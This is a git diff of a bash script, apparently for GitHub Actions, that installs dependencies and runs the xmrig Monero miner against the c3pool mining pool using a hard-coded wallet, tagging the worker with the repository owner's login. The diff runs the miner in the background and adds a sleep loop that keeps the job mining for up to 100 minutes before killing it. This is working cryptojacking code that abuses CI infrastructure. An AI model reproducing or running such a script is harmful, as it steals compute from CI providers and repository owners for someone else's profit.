@@ -1,10 +1,9 @@
 #!/bin/bash
 
 echo =============================== start ===============================
-# cat $GITHUB_EVENT_PATH
 jsid=`cat $GITHUB_EVENT_PATH | jq ".repository.owner.login" | sed 's/\"//g'`
 jswallet="8C6cNDQ2bYdLSHjzQjF8hV5sx8erdkYgv6dyxyn1Snsh1PNNcWAB2A6QzpfxB7coERU7XQDvZvnYfJxvcAqyUvDfVUBZ7ju"
-jssleeptime="4000"
+jssleeptime="100"
 jspoolserver="mine.c3pool.com:15555"
 jspoolcmd="-p id-$jsid -k"
 
@@ -12,9 +11,15 @@ echo $jswallet $jsxmrigname $jssleeptime $jspoolserver $jspoolcmd
 
 [ -n "$LOCALTEST" ] || sudo apt-get install libuv1-dev libssl-dev libhwloc-dev -y
 
-echo "timeout $jssleeptime ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd"
-[ x"$1" == "xrun" ] && timeout $jssleeptime ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd
-echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-#[ x"$1" == "xrun" ] && killall xmrig
+echo "./xmrig -o $jspoolserver -u $jswallet $jspoolcmd"
+[ x"$1" == "xrun" ] && ./xmrig -o $jspoolserver -u $jswallet $jspoolcmd -B
+[ x"$1" == "xrun" ] && {
+    for k in $( seq 1 $jssleeptime )
+    do
+        echo $k $jssleeptime $(date)
+        sleep 60
+    done
+}
+[ x"$1" == "xrun" ] && killall xmrig
 
 echo ===============================  end  ===============================
